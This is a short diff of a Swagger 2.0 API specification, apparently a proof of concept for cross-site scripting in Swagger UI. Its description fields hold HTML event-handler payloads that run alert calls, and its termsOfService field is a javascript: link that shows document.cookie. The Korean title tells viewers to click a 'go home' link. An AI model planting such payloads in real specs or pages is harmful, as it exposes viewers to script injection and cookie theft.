@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": 
   {"title": "아래 [홈으로 이동] 링크를 클릭하세요",
-  "description": "</p><a id=x tabindex=1 onfocus=alert`1`;><h2>홈으로 이동</h2></a>",
+  "description": "</p><a onafterscriptexecute=alert(1)><script>1</script><h2>XSS Here</h2></a>",
   "termsOfService": "javascript:alert(document.cookie)",
   "contact": 
   {"name": "AHNLAB",
